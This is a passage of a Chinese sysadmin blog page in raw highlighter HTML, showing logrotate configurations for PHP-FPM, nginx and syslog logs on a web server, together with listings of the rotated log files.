data-line=\"crayon-594bd56e45ba1326173986-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-31\">31</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/logrotate.d/php </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-e\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">php</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-e\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">daily</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-4\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">365</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">missingok</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">notifempty</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">compress</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-8\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">dateext</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-9\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">sharedscripts</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">postrotate</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-11\"><span class=\"crayon-e\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php5</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6.26</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fpm</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">USR1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php5</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6.26</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fpm</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pid</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-14\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">endscript</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-15\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">postrotate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">644</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-e\">gz</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-17\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">endscript</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-18\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-20\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /Data/app/php5.6.26/var/run/php-fpm.pid </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-21\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Dec</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php5</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6.26</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">php</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fpm</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">pid</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-22\"> </div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-23\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cd /Data/logs/php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-24\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">huanqiu_web1 </span><span class=\"crayon-v\">php</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-25\"><span class=\"crayon-i\">total</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25676</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-26\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root   </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jun</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2016</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-27\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nobody </span><span class=\"crayon-i\">nobody</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">182</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2015</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20150830.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-28\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nobody </span><span class=\"crayon-i\">nobody</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">371</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Sep</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2015</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20150901.gz</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-29\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nobody </span><span class=\"crayon-i\">nobody</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">315</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Sep</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2015</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20150907.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba1326173986-30\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba1326173986-31\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0060 seconds] -->\r\n<p>———————————-nginx日志切割一例———————————–</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45ba5771262431\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# cat /etc/logrotate.d/nginx \r\n/Data/logs/nginx/*/*log {\r\n    daily\r\n    rotate 365\r\n    missingok\r\n    notifempty\r\n    compress\r\n    dateext\r\n    sharedscripts\r\n    postrotate\r\n    /etc/init.d/nginx reload\r\n    endscript\r\n}\r\n\r\n[root@huanqiu_web1 ~]# ll /Data/logs/nginx/www.huanqiu.com/\r\n..........\r\n-rw-r--r-- 1 root root      1652 Jan  1 00:00 error.log-20170101.gz\r\n-rw-r--r-- 1 root root      1289 Jan  2 00:00 error.log-20170102.gz\r\n-rw-r--r-- 1 root root      1633 Jan  3 00:00 error.log-20170103.gz\r\n-rw-r--r-- 1 root root      3239 Jan  4 00:00 error.log-20170104.gz</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba5771262431-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba5771262431-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/logrotate.d/nginx </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-e\">Data</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nginx</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-e\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">daily</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-4\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">365</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">missingok</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">notifempty</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">compress</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-8\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">dateext</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-9\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">sharedscripts</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">postrotate</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">init</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nginx </span><span class=\"crayon-e\">reload</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-12\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">endscript</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-13\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-14\"> </div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-15\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ll /Data/logs/nginx/www.huanqiu.com/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-17\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">1652</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170101.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-18\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">1289</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170102.gz</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45ba5771262431-19\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">1633</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170103.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45ba5771262431-20\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">3239</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20170104.gz</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p>———————————-系统日志切割一例———————————–</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45ba9152896608\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# cat /etc/logrotate.d/syslog \r\n/var/log/cron\r\n/var/log/maillog\r\n/var/log/messages\r\n/var/log/secure\r\n/var/log/spooler\r\n{\r\n    sharedscripts\r\n    postrotate\r\n    /bin/kill -HUP `cat /var/run/syslogd.pid 2&gt; /dev/null` 2&gt; /dev/null || true\r\n    endscript\r\n}\r\n\r\n[root@huanqiu_web1 ~]# ll /var/log/messages*\r\n-rw------- 1 root root 34248975 Jan 19 18:42 /var/log/messages\r\n-rw------- 1 root root 51772994 Dec 25 03:11 /var/log/messages-20161225\r\n-rw------- 1 root root 51800210 Jan  1 03:05 /var/log/messages-20170101\r\n-rw------- 1 root root 51981366 